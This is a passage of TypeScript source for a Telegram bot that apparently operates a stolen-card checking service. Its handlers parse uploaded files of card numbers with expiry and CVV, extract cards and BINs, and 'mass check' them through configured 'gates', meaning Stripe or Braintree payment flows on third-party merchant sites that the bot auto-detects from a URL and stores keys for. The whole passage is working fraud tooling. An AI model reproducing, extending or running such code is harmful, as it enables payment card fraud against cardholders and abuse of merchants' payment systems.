      const caption = (msg.caption || "").trim().toLowerCase();
      const captionMode: "ccex" | "binex" | "mass" | null =
        /^\/?ccex\b/.test(caption)  ? "ccex"  :
        /^\/?binex\b/.test(caption) ? "binex" :
        /^\/?mass\b/.test(caption)  ? "mass"  : null;

      if (!captionMode) {
        // Peek inside with the same extractor /ccex + /mass use, so the hint
        // accurately reflects what those commands would find. The old ad-hoc
        // regex missed cards in surrounding text (labels, headers, prose)
        // and lied to users about file contents.
        let hint = "Pick how to handle this file:";
        try {
          const link = await bot?.getFileLink(doc.file_id);
          if (link) {
            const resp = await fetch(link);
            const head = (await resp.text()).slice(0, 32_000);  // 32 KB is plenty for shape detection
            const cards = extractCards(head);
            const summary = summarizeExtraction(cards);
            if (summary.withCvv > 0) {
              hint = `Found *${summary.withCvv}* checkable card(s)${summary.withExpiryOnly ? ` (+ ${summary.withExpiryOnly} without CVV)` : ""} — use \`/mass\` to check them or \`/ccex\` to extract.`;
            } else if (summary.withExpiryOnly > 0 || summary.bareBins > 0) {
              hint = `Found *${summary.withExpiryOnly + summary.bareBins}* card(s) but none have CVV — use \`/ccex\` to extract or \`/binex\` for the BINs.`;
            } else {
              // No card-shaped data — might still be BINs (no expiry/CVV) the
              // extractor skipped. Quick line-shape check distinguishes.
              const lines = head.split(/\r?\n/).filter(l => l.trim().length > 0).slice(0, 20);
              if (lines.length > 0 && lines.every(l => /^\d{6,8}$/.test(l.trim()))) {
                hint = "Looks like a BIN list — try `/binex`.";
              }
            }
          }
        } catch {}
        bot?.sendMessage(chatId,
`📎 *File received:* \`${doc.file_name}\` (${(doc.file_size ?? 0).toLocaleString()} bytes)

${hint}

*Re-send the file with a caption:*
  \`/mass\`  — Mass check every card against your selected gate
  \`/ccex\`  — Extract valid card lines
  \`/binex\` — Extract 6-digit BINs (\`/binex 8\` for 8-digit)

Tip: tap the 📎 → choose file again → type the caption in the same message.`,
          { parse_mode: "Markdown" });
        return;
      }

      try {
        const fileLink = await bot?.getFileLink(doc.file_id);
        if (!fileLink) {
          bot?.sendMessage(chatId, "❌ Could not download file.");
          return;
        }

        const response = await fetch(fileLink);
        const text = await response.text();

        // ─── Caption-driven extract path ───────────────────────────────────
        if (captionMode === "ccex") {
          if (!isFeatureEnabled("ccex")) { bot?.sendMessage(chatId, "🚫 /ccex is disabled."); return; }
          const cards = extractCards(text);
          if (!cards.length) { bot?.sendMessage(chatId, `⚠️ No valid cards in \`${doc.file_name}\``, { parse_mode: "Markdown" }); return; }
          const sum = summarizeExtraction(cards);
          const display = cards.slice(0, 80).join("\n");
          const head = `💳 *${cards.length}* card(s) from \`${doc.file_name}\`\n*Full:* ${sum.withCvv} · *No CVV:* ${sum.withExpiryOnly} · *Bare PAN:* ${sum.bareBins}\n━━━━━━━━━━━━━━━━━━━━\n\`\`\`\n${display}${cards.length > 80 ? `\n... +${cards.length - 80} more` : ""}\n\`\`\``;
          // If the full output overflows a single message, attach the rest as a file.
          if (head.length <= 4000) {
            bot?.sendMessage(chatId, head, { parse_mode: "Markdown" });
          } else {
            bot?.sendMessage(chatId, `💳 *${cards.length}* card(s) extracted — full list attached.`, { parse_mode: "Markdown" });
            try {
              const buf = Buffer.from(cards.join("\n"), "utf8");
              await bot?.sendDocument(chatId, buf, {}, { filename: `ccex-${doc.file_name}`, contentType: "text/plain" });
            } catch {}
          }
          return;
        }
        if (captionMode === "binex") {
          if (!isFeatureEnabled("binex")) { bot?.sendMessage(chatId, "🚫 /binex is disabled."); return; }
          const lenMatch = caption.match(/\b(6|8)\b/);
          const binLen: 6 | 8 = lenMatch?.[1] === "8" ? 8 : 6;
          const bins = extractBins(text, binLen);
          if (!bins.length) { bot?.sendMessage(chatId, `⚠️ No valid BINs in \`${doc.file_name}\``, { parse_mode: "Markdown" }); return; }
          const display = bins.slice(0, 100).join("\n");
          const head = `🏦 *${bins.length}* unique ${binLen}-digit BIN(s) from \`${doc.file_name}\`\n━━━━━━━━━━━━━━━━━━━━\n\`\`\`\n${display}${bins.length > 100 ? `\n... +${bins.length - 100} more` : ""}\n\`\`\``;
          if (head.length <= 4000) {
            bot?.sendMessage(chatId, head, { parse_mode: "Markdown" });
          } else {
            bot?.sendMessage(chatId, `🏦 *${bins.length}* BIN(s) — full list attached.`, { parse_mode: "Markdown" });
            try {
              const buf = Buffer.from(bins.join("\n"), "utf8");
              await bot?.sendDocument(chatId, buf, {}, { filename: `binex-${doc.file_name}`, contentType: "text/plain" });
            } catch {}
          }
          return;
        }

        // ─── Mass-check flow — only when caption is /mass ──────────────────
        // (was the default for any captionless .txt before this change)
        if (captionMode !== "mass") return;
        // Single shared parser — same one the interactive /mass listener uses.
        // Line-by-line parseCardInputDetailed (all delimiters + Luhn) merged
        // with extractCards (embedded/messy text). Guarantees identical
        // behavior whether cards are pasted or uploaded as a file.
        const cards = parseCardsBlob(text);
        const maxCards = getMaxCards(hasAdminAccess);
        const count = Math.min(cards.length, maxCards);

        if (count === 0) {
          // Useful diagnostic — show what was found so the user can fix format.
          const summary = summarizeExtraction(extractCards(text));
          const hint = (summary.withCvv + summary.withExpiryOnly + summary.bareBins) === 0
            ? `\n_No card-shaped digits found. File may be in an unexpected format, or contain only BINs._`
            : `\n_Found ${summary.withExpiryOnly + summary.bareBins} card(s) without a usable CVV (no-CVV: ${summary.withExpiryOnly}, bare PAN: ${summary.bareBins})._\n_Try /binex for BIN-only files, or include CVVs as \`PAN|MM|YYYY|CVV\`._`;
          bot?.sendMessage(chatId, `❌ No checkable cards in \`${doc.file_name}\`.${hint}`, { parse_mode: "Markdown" });
          return;
        }

        const cardLines = cards.slice(0, count);
        const capNote  = cards.length > maxCards ? ` (capped at ${maxCards}; you sent ${cards.length})` : "";
        bot?.sendMessage(chatId, `📁 File loaded: *${count}* cards from \`${doc.file_name}\`${capNote}`, { parse_mode: "Markdown" });

        if (hasAdminAccess) {
          const allGates = await storage.getGateConfigs();
          const activeGates = allGates.filter(g => g.active);
          if (activeGates.length > 1) {
            pendingMassChecks.set(telegramId, { cards: cardLines });
            const keyboard = activeGates.map(g => [{
              text: `${g.name} (${g.gateType.toUpperCase()})`,
              callback_data: `massgate_${g.id}`,
            }]);
            keyboard.push([{ text: "🎲 Random Gate", callback_data: "massgate_random" }]);
            keyboard.push([{ text: "📌 Current Default", callback_data: "massgate_default" }]);
            bot?.sendMessage(chatId, `🔧 *Select gate for ${count} cards:*`, {
              parse_mode: "Markdown",
              reply_markup: { inline_keyboard: keyboard },
            });
            return;
          }
        }

        await executeMassCheck(chatId, telegramId, cardLines);
      } catch (err: any) {
        bot?.sendMessage(chatId, `❌ Error reading file: ${err.message}`);
      }
    });

    bot.onText(/^\/gates(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const gates = await storage.getGateConfigs();
      if (gates.length === 0) {
        bot?.sendMessage(chatId, "⚠️ No gates configured. Use /addgate to create one.");
        return;
      }

      const selectedId = userGateSelection.get(telegramId);
      const isRandom = userRandomGate.get(telegramId) ?? false;

      const header =
        `🔧 *Gate List* (${gates.length})\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `*Mode:* ${isRandom ? "🎲 Random" : "📌 Manual"}\n\n`;
      const footer =
        `\n━━━━━━━━━━━━━━━━━━━━\n` +
        `Use /setgate to select · /randomgate to toggle`;

      // Build per-gate blocks with markdown-escaped names so a gate named
      // "BANK *Special*" or "shop_v3" doesn't break Markdown parsing and
      // cause Telegram to silently drop the whole message.
      const blocks: string[] = [];
      for (const gate of gates) {
        const status = gate.active ? "🟢" : "🔴";
        const selected = gate.id === selectedId && !isRandom ? " ◀️" : "";
        const gs = (gate.settings as Record<string, any>) || {};
        const hasKey = gs.publicKey || gs.btClientToken;
        let block = `${status} *${tgEscape(gate.name)}*${selected}\n`;
        block += `   Type: ${gate.gateType.toUpperCase()} · ${tgEscape(gate.subType || "standard")}\n`;
        if (hasKey) block += `   Key: ✅ Configured\n`;
        block += `\n`;
        blocks.push(block);
      }

      // Telegram caps a single message at 4096 chars — chunk so a long
      // gate list doesn't silently fail to send.
      const MAX = 3900;
      let current = header;
      const chunks: string[] = [];
      for (const b of blocks) {
        if ((current + b).length > MAX) {
          chunks.push(current);
          current = "";
        }
        current += b;
      }
      if (current.trim()) chunks.push(current);
      chunks[chunks.length - 1] += footer;

      for (let i = 0; i < chunks.length; i++) {
        await bot?.sendMessage(chatId, chunks[i], { parse_mode: "Markdown" })
          .catch((e: any) => {
            // If Markdown still fails for any reason, retry as plain text so
            // the user always gets the list.
            console.error(`[/gates] Markdown send failed (chunk ${i + 1}/${chunks.length}):`, e?.message);
            bot?.sendMessage(chatId, chunks[i].replace(/[*_`\[\]]/g, ""));
          });
      }
    });

    bot.onText(/\/setgate$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const gates = await storage.getGateConfigs();
      const activeGates = gates.filter(g => g.active);

      if (activeGates.length === 0) {
        bot?.sendMessage(chatId, "⚠️ No active gates available.");
        return;
      }

      const keyboard = activeGates.map(g => {
        const gateSettings = (g.settings as Record<string, any>) || {};
        const hasKey = gateSettings.publicKey || gateSettings.btClientToken;
        return [{
          text: `${g.name} (${g.gateType.toUpperCase()})${hasKey ? " ✅" : ""}`,
          callback_data: `selectgate_${g.id}`,
        }];
      });

      bot?.sendMessage(chatId, "🔧 *Select Gate:*", {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard },
      });
    });

    bot.onText(/\/setgate (.+)/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const gateName = match?.[1]?.trim() || "";
      const gates = await storage.getGateConfigs();
      const found = gates.find(g => g.name.toLowerCase() === gateName.toLowerCase() || g.id === gateName);

      if (!found) {
        bot?.sendMessage(chatId, `❌ Gate "${gateName}" not found. Use /setgate to see options.`);
        return;
      }

      userGateSelection.set(telegramId, found.id);
      userRandomGate.set(telegramId, false);
      bot?.sendMessage(chatId, `✅ Gate set to *${found.name}*\nRandom mode: *OFF*`, { parse_mode: "Markdown" });
    });

    // ── /editgate — interactive gate configuration editor ─────────────────────
    bot.onText(/\/editgate(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("editgate")) { bot?.sendMessage(chatId, "🚫 /editgate is disabled."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      const allGates = await storage.getGateConfigs();
      if (allGates.length === 0) {
        bot?.sendMessage(chatId, "⚠️ No gates configured.");
        return;
      }
      const filter = (match?.[1] || "").trim().toLowerCase();
      const gates = filter
        ? allGates.filter(g => g.name.toLowerCase().includes(filter) || g.id.startsWith(filter))
        : allGates;
      if (gates.length === 0) {
        bot?.sendMessage(chatId, `⚠️ No gate matches "${filter}".`);
        return;
      }
      if (gates.length === 1) {
        // One match → jump straight into the category menu
        editContext.set(telegramId, { gateId: gates[0].id });
        const { text, keyboard } = renderCategoryMenu(gates[0]);
        bot?.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
        return;
      }
      // Multiple → show picker
      const keyboard = gates.map(g => [{
        text: `${g.active ? "🟢" : "🔴"} ${g.name} (${g.gateType})`,
        callback_data: `eg_pick_${g.id.slice(0, 8)}`,
      }]);
      bot?.sendMessage(chatId,
`🛠 *Pick a gate to edit*
━━━━━━━━━━━━━━━━━━━━
${gates.length} gates · use \`/editgate <name>\` to filter`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
    });

    bot.on("callback_query", async (query) => {
      const chatId = query.message?.chat.id;
      const telegramId = query.from.id.toString();
      const data = query.data || "";

      if (data.startsWith("massgate_")) {
        const pending = pendingMassChecks.get(telegramId);
        if (!pending) {
          bot?.answerCallbackQuery(query.id, { text: "No pending mass check" });
          return;
        }
        pendingMassChecks.delete(telegramId);
        bot?.answerCallbackQuery(query.id, { text: "Starting mass check..." });

        let gateOverride: any = undefined;
        if (data === "massgate_random") {
          userRandomGate.set(telegramId, true);
        } else if (data === "massgate_default") {
        } else {
          const gateId = data.replace("massgate_", "");
          const gate = await storage.getGateConfig(gateId);
          if (gate && gate.active) {
            gateOverride = gate;
          } else if (gate && !gate.active) {
            if (chatId) bot?.sendMessage(chatId, "⚠️ Selected gate is inactive. Using default.");
          }
        }

        if (chatId) {
          executeMassCheck(chatId, telegramId, pending.cards, gateOverride);
        }
        return;
      }

      if (data.startsWith("selectgate_")) {
        const gateId = data.replace("selectgate_", "");
        const gate = await storage.getGateConfig(gateId);

        if (gate) {
          userGateSelection.set(telegramId, gate.id);
          userRandomGate.set(telegramId, false);
          bot?.answerCallbackQuery(query.id, { text: `Gate: ${gate.name}` });
          if (chatId) {
            bot?.sendMessage(chatId, `✅ Gate set to *${gate.name}*\nRandom mode: *OFF*`, { parse_mode: "Markdown" });
          }
        } else {
          bot?.answerCallbackQuery(query.id, { text: "Gate not found" });
        }
      }

      // ── /aiconfig callback flow ─────────────────────────────────────────────
      if (data.startsWith("aic_")) {
        try {
          const botUser = await storage.getBotUser(telegramId);
          if (!await checkAdmin(telegramId, botUser)) {
            bot?.answerCallbackQuery(query.id, { text: "Admin only" });
            return;
          }
          const apiKey = readAIKey();

          if (data.startsWith("aic_pick_")) {
            if (!apiKey) { bot?.answerCallbackQuery(query.id, { text: "Set /setaikey first" }); return; }
            const short = data.replace("aic_pick_", "");
            const gates = await storage.getGateConfigs();
            const gate = gates.find(g => g.id.startsWith(short));
            if (!gate) { bot?.answerCallbackQuery(query.id, { text: "Gate not found" }); return; }
            bot?.answerCallbackQuery(query.id);
            if (chatId) runAiConfigure(chatId, telegramId, gate.id, apiKey);
            return;
          }

          const pending = pendingAiConfig.get(telegramId);
          if (!pending) { bot?.answerCallbackQuery(query.id, { text: "Recommendation expired — run /aiconfig again" }); return; }

          if (data === "aic_cancel") {
            pendingAiConfig.delete(telegramId);
            bot?.answerCallbackQuery(query.id, { text: "Cancelled" });
            const msgId = query.message?.message_id;
            if (chatId && msgId) bot?.editMessageText("✖️ AI configuration discarded.", { chat_id: chatId, message_id: msgId }).catch(() => {});
            return;
          }
          if (data === "aic_show") {
            // Render full JSON of changes (chunked if needed)
            const json = JSON.stringify(pending.changes, null, 2);
            const chunks: string[] = [];
            for (let i = 0; i < json.length; i += 3500) chunks.push(json.slice(i, i + 3500));
            bot?.answerCallbackQuery(query.id);
            if (chatId) {
              for (const c of chunks) {
                bot?.sendMessage(chatId, "```\n" + c + "\n```", { parse_mode: "Markdown" });
              }
            }
            return;
          }
          if (data === "aic_apply") {
            const gate = await storage.getGateConfig(pending.gateId);
            if (!gate) { bot?.answerCallbackQuery(query.id, { text: "Gate gone" }); pendingAiConfig.delete(telegramId); return; }
            const merged = { ...((gate.settings as any) || {}) };
            let applied = 0;
            for (const [k, v] of Object.entries(pending.changes)) {
              const emptyOk = k === "btFlow" || k === "wcPaySlug";
              if (v !== undefined && v !== null && (emptyOk || String(v).trim() !== "")) {
                merged[k] = v;
                applied++;
              }
            }
            await storage.updateGateConfig(pending.gateId, { settings: merged } as any);
            pendingAiConfig.delete(telegramId);
            bot?.answerCallbackQuery(query.id, { text: `Applied ${applied} fields` });
            const msgId = query.message?.message_id;
            const successText = `✅ *Applied ${applied} fields* to \`${tgEscape(gate.name)}\`\nRun /editgate to verify, or /chk to test live.`;
            if (chatId && msgId) bot?.editMessageText(successText, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }).catch(() => {
              bot?.sendMessage(chatId, successText, { parse_mode: "Markdown" });
            });
            return;
          }
          return;
        } catch (err: any) {
          console.error("[aiconfig] callback failed:", err);
          try { bot?.answerCallbackQuery(query.id, { text: "Error — see log" }); } catch {}
          if (chatId) try { bot?.sendMessage(chatId, `❌ AI config error: \`${(err?.message || String(err)).slice(0, 200)}\``, { parse_mode: "Markdown" }); } catch {}
          return;
        }
      }

      // ── /addgate interactive callback flow ──────────────────────────────────
      if (data.startsWith("gs_")) {
        try {
          const botUser = await storage.getBotUser(telegramId);
          if (!await checkAdmin(telegramId, botUser)) {
            bot?.answerCallbackQuery(query.id, { text: "Admin only" });
            return;
          }
          const msgId = query.message?.message_id;

          // gs_mass_stop_<telegramId> — request interrupt for a running mass run
          if (data.startsWith("gs_mass_stop_")) {
            const target = data.replace("gs_mass_stop_", "");
            if (target !== telegramId) {
              bot?.answerCallbackQuery(query.id, { text: "Only the runner can stop this batch." });
              return;
            }
            massStopRequested.add(telegramId);
            bot?.answerCallbackQuery(query.id, { text: "Stopping after current batch…" });
            return;
          }

          // Cancel — wipe context, close menu
          if (data === "gs_cancel") {
            gateSetupCtx.delete(telegramId);
            bot?.answerCallbackQuery(query.id, { text: "Cancelled" });
            if (chatId && msgId) bot?.editMessageText("✖️ Gate setup cancelled.", { chat_id: chatId, message_id: msgId }).catch(() => {});
            return;
          }

          // ── Mode selection ──────────────────────────────────────────────────
          if (data === "gs_auto") {
            const ctx: GateSetupCtx = { mode: "auto", step: "await_url", chatId: chatId! };
            gateSetupCtx.set(telegramId, ctx);
            bot?.answerCallbackQuery(query.id);
            if (chatId && msgId) bot?.editMessageText(`🔍 *Auto-Detect*\n━━━━━━━━━━━━━━━━━━━━\nSend me the *site URL* and I will detect the payment gateway:`, {
              chat_id: chatId, message_id: msgId, parse_mode: "Markdown",
              reply_markup: { inline_keyboard: [[{ text: "✖️ Cancel", callback_data: "gs_cancel" }]] },
            }).catch(() => {});
            return;
          }

          if (data === "gs_mass") {
            const ctx: GateSetupCtx = { mode: "mass", step: "await_urls", chatId: chatId! };
            gateSetupCtx.set(telegramId, ctx);
            bot?.answerCallbackQuery(query.id);
            if (chatId && msgId) bot?.editMessageText(`📋 *Mass Gate Setup*\n━━━━━━━━━━━━━━━━━━━━\nSend URLs *one per line* (or comma-separated).\nEach will be auto-detected and saved as a gate.`, {
              chat_id: chatId, message_id: msgId, parse_mode: "Markdown",
              reply_markup: { inline_keyboard: [[{ text: "✖️ Cancel", callback_data: "gs_cancel" }]] },
            }).catch(() => {});
            return;
          }

          // Helper to answer + re-render wizard in one call
          const gsAck = async (ctx: GateSetupCtx) => {
            bot?.answerCallbackQuery(query.id);
            if (chatId) await gsEditWizard(chatId, telegramId, ctx);
          };

          if (data === "gs_manual") {
            const ctx: GateSetupCtx = { mode: "manual", step: "pick_type", chatId: chatId!, msgId };
            gateSetupCtx.set(telegramId, ctx);
            await gsAck(ctx);
            return;
          }

          // Recovery helper: when a mid-flow callback fires but ctx is gone
          // (server restart, parallel wizard, OOM), reset to a fresh manual
          // wizard pinned to this very message so the user just picks up
          // again without retyping /addgate. Returns true if the recovery
          // path handled the callback.
          const gsRecoverIfNeeded = (existing: GateSetupCtx | undefined): GateSetupCtx => {
            if (existing) return existing;
            const fresh: GateSetupCtx = { mode: "manual", step: "pick_type", chatId: chatId!, msgId };
            gateSetupCtx.set(telegramId, fresh);
            bot?.answerCallbackQuery(query.id, { text: "Session restored — pick a gateway type" });
            return fresh;
          };

          // ── Manual: gate type → sub-type ────────────────────────────────────
          if (data.startsWith("gs_type_")) {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            ctx.gateType = data.replace("gs_type_", "");
            ctx.subType = undefined; ctx.url = undefined;
            ctx.publicKey = undefined; ctx.btClientToken = undefined; ctx.name = undefined;
            ctx.step = "pick_subtype";
            await gsAck(ctx);
            return;
          }

          // ── Manual: sub-type selected → ask for URL ──────────────────────────
          if (data.startsWith("gs_st_")) {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            if (!ctx.gateType) { bot?.answerCallbackQuery(query.id, { text: "Pick a gateway type first" }); return; }
            ctx.subType = data.replace("gs_st_", "");
            ctx.url = undefined; ctx.publicKey = undefined; ctx.btClientToken = undefined; ctx.name = undefined;
            ctx.step = "await_url";
            await gsAck(ctx);
            return;
          }

          // ── Manual: forward navigation (after confirm steps) ─────────────────
          // These require prior state — fall back to fresh wizard if missing.
          if (data === "gs_step_key") {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            if (!ctx.url) { await gsAck(ctx); return; }   // restart wizard
            ctx.step = "await_key";
            await gsAck(ctx);
            return;
          }
          if (data === "gs_step_name") {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            if (!ctx.url) { await gsAck(ctx); return; }
            ctx.step = "await_name";
            await gsAck(ctx);
            return;
          }
          if (data === "gs_name_skip") {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            if (!ctx.url) { await gsAck(ctx); return; }
            ctx.name = gsAutoName(ctx);
            ctx.step = "review";
            await gsAck(ctx);
            return;
          }

          // ── Manual: back to mode selection menu ──────────────────────────────
          if (data === "gs_back_menu") {
            gateSetupCtx.delete(telegramId);
            bot?.answerCallbackQuery(query.id);
            const menuText = `🚀 *Add New Gate*\n━━━━━━━━━━━━━━━━━━━━\nChoose how to add a gate:`;
            const menuKb = [
              [{ text: "🔍 Auto-Detect URL", callback_data: "gs_auto" }, { text: "📋 Mass Setup", callback_data: "gs_mass" }],
              [{ text: "✏️ Manual Step-by-Step", callback_data: "gs_manual" }],
            ];
            if (chatId && msgId) bot?.editMessageText(menuText, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: menuKb } }).catch(() => {});
            return;
          }

          // ── Manual: back / edit navigation ───────────────────────────────────
          // All back/edit handlers recover gracefully — gsRecoverIfNeeded
          // returns a fresh "pick_type" wizard if ctx was wiped between
          // command and tap. The user just picks up from step 1.
          if (data === "gs_back_type") {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            ctx.gateType = undefined; ctx.subType = undefined; ctx.url = undefined;
            ctx.publicKey = undefined; ctx.btClientToken = undefined; ctx.name = undefined;
            ctx.step = "pick_type";
            await gsAck(ctx);
            return;
          }
          if (data === "gs_back_subtype") {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            ctx.subType = undefined; ctx.url = undefined;
            ctx.publicKey = undefined; ctx.btClientToken = undefined; ctx.name = undefined;
            ctx.step = ctx.gateType ? "pick_subtype" : "pick_type";
            await gsAck(ctx);
            return;
          }
          if (data === "gs_back_url" || data === "gs_edit_url") {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            ctx.url = undefined; ctx.publicKey = undefined; ctx.btClientToken = undefined; ctx.name = undefined;
            ctx.step = ctx.subType ? "await_url" : ctx.gateType ? "pick_subtype" : "pick_type";
            await gsAck(ctx);
            return;
          }
          if (data === "gs_back_key" || data === "gs_edit_key") {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            ctx.publicKey = undefined; ctx.btClientToken = undefined; ctx.name = undefined;
            ctx.step = ctx.url ? "await_key" : ctx.subType ? "await_url" : "pick_type";
            await gsAck(ctx);
            return;
          }
          if (data === "gs_edit_name" || data === "gs_back_name") {
            const ctx = gsRecoverIfNeeded(gateSetupCtx.get(telegramId));
            ctx.name = undefined;
            ctx.step = ctx.url ? "await_name" : "pick_type";
            await gsAck(ctx);
            return;
          }

          // ── Shared gate-creation helper (works for manual + auto-detect) ───────
          const gsCreateGate = async (c: GateSetupCtx): Promise<string> => {
            const d = c.detection;
            const settings: Record<string, any> = d?.settings ? { ...d.settings } : {};
            if (c.publicKey) settings.publicKey = c.publicKey;
            if (c.btClientToken) settings.btClientToken = c.btClientToken;
            const gate = await storage.createGateConfig({
              name: c.name || gsAutoName(c),
              gateType: d?.gateType || c.gateType || "stripe",
              subType: d?.subType || c.subType || "payment_intents",
              url: d?.siteUrl || c.url || "",
              active: true,
              settings,
            });
            await storage.createSystemLog({ level: "SUCCESS", message: `Gate "${gate.name}" (${gate.gateType}) added via Telegram wizard`, source: "telegram" });
            return gate.id;
          };

          // ── Auto-detect: save or save+configure ─────────────────────────────
          if (data === "gs_save_auto" || data === "gs_save_auto_edit") {
            let ctx = gateSetupCtx.get(telegramId);

            // Self-healing: if the session was wiped (server restart, parallel
            // /addgate overwrote it, OOM cleared memory), recover by re-running
            // detection on the URL visible in the message text. Saves the user
            // from having to retype the URL just because the bot blinked.
            if (!ctx?.detection) {
              const msgText = (query.message as any)?.text || (query.message as any)?.caption || "";
              const urlMatch = msgText.match(/URL:\s*`([^`]+)`/) || msgText.match(/(https?:\/\/\S+)/);
              const recoveredUrl = urlMatch?.[1]?.trim();
              if (!recoveredUrl) {
                bot?.answerCallbackQuery(query.id, { text: "Session expired — run /addgate <url> again" });
                if (chatId && msgId) bot?.editMessageText(
                  "⏳ *Session expired*\n━━━━━━━━━━━━━━━━━━━━\nRun `/addgate <url>` again to retry.",
                  { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }
                ).catch(() => {});
                return;
              }
              bot?.answerCallbackQuery(query.id, { text: "Session lost — re-detecting…" });
              if (chatId && msgId) bot?.editMessageText(
                `🔄 *Re-detecting* \`${recoveredUrl.slice(0, 50)}\`…\n(session was lost; recovering from URL in message)`,
                { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }
              ).catch(() => {});
              try {
                const detection = await detectGateFromUrl(recoveredUrl);
                if (detection.gateType === "unknown") {
                  if (chatId && msgId) bot?.editMessageText(
                    `❌ Recovery failed — couldn't detect gateway. Run \`/addgate ${recoveredUrl}\` manually.`,
                    { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }
                  ).catch(() => {});
                  return;
                }
                ctx = {
                  mode: "auto",
                  step: "confirm_auto",
                  chatId: chatId!,
                  url: recoveredUrl,
                  detection,
                  name: autoGateName(detection.gateType, detection.siteUrl || recoveredUrl),
                };
              } catch (e: any) {
                if (chatId && msgId) bot?.editMessageText(
                  `❌ Recovery failed: ${e?.message?.slice(0, 80) || "detection error"}`,
                  { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }
                ).catch(() => {});
                return;
              }
            } else {
              bot?.answerCallbackQuery(query.id, { text: "Saving…" });
            }

            try {
              const gateId = await gsCreateGate(ctx);
              gateSetupCtx.delete(telegramId);
              const saved = await storage.getGateConfig(gateId);
              if (!saved) throw new Error("Gate not found after create");
              if (data === "gs_save_auto_edit") {
                editContext.set(telegramId, { gateId: saved.id });
                const { text: eText, keyboard: eKb } = renderCategoryMenu(saved);
                if (chatId && msgId) bot?.editMessageText(eText, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: eKb } }).catch(() => {});
              } else {
                if (chatId && msgId) bot?.editMessageText(
                  `✅ *Gate Saved!*\n*${saved.name}* — ${saved.gateType?.toUpperCase()} · ${saved.subType}\n\nUse /editgate to configure advanced fields.`,
                  { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }
                ).catch(() => {});
              }
            } catch (e: any) {
              bot?.sendMessage(chatId!, `❌ Save failed: ${(e as any).message?.slice(0, 100)}`);
              gateSetupCtx.delete(telegramId);
            }
            return;
          }

          // ── Manual-wizard saves — gs_save_manual saves & closes wizard,
          //    gs_save_and_edit saves & hands off to /editgate category menu.
          //    Same code path; one flag picks which end-state runs.
          if (data === "gs_save_manual" || data === "gs_save_and_edit") {
            const goToEditor = data === "gs_save_and_edit";
            const ctx = gateSetupCtx.get(telegramId);
            if (!ctx?.url) {
              bot?.answerCallbackQuery(query.id, { text: "Session lost" });
              if (chatId && msgId) bot?.editMessageText(
                "⏳ *Session lost*\n━━━━━━━━━━━━━━━━━━━━\nManual setup state was wiped (server restart?). Run `/addgate` to start again.",
                { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }
              ).catch(() => {});
              return;
            }
            bot?.answerCallbackQuery(query.id, { text: "Saving…" });
            try {
              const gateId = await gsCreateGate(ctx);
              gateSetupCtx.delete(telegramId);
              const saved = await storage.getGateConfig(gateId);
              if (!saved) throw new Error("Gate not found after create");
              if (goToEditor && chatId && msgId) {
                editContext.set(telegramId, { gateId: saved.id });
                const { text: eText, keyboard: eKb } = renderCategoryMenu(saved);
                bot?.editMessageText(eText, {
                  chat_id: chatId, message_id: msgId, parse_mode: "Markdown",
                  reply_markup: { inline_keyboard: eKb },
                }).catch(() => {});
              } else if (chatId && msgId) {
                bot?.editMessageText(
                  `✅ *Gate Saved!*\n*${saved.name}* — ${(saved.gateType || "").toUpperCase()} · ${saved.subType}\n\nUse /editgate to configure advanced fields.`,
                  { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }
                ).catch(() => {});
              }
            } catch (e: any) {
              bot?.sendMessage(chatId!, `❌ Save failed: ${(e as any).message?.slice(0, 100)}`);
              gateSetupCtx.delete(telegramId);
            }
            return;
          }
        } catch (err: any) {
          console.error("[gs_callback] error:", err);
          try { bot?.answerCallbackQuery(query.id, { text: "Error" }); } catch {}
        }
        return;
      }

      // ── /editgate callback flow ─────────────────────────────────────────────
      if (data.startsWith("eg_")) {
        try {
        const botUser = await storage.getBotUser(telegramId);
        if (!await checkAdmin(telegramId, botUser)) {
          bot?.answerCallbackQuery(query.id, { text: "Admin only" });
          return;
        }
        const ctx = editContext.get(telegramId);
        const msgId = query.message?.message_id;

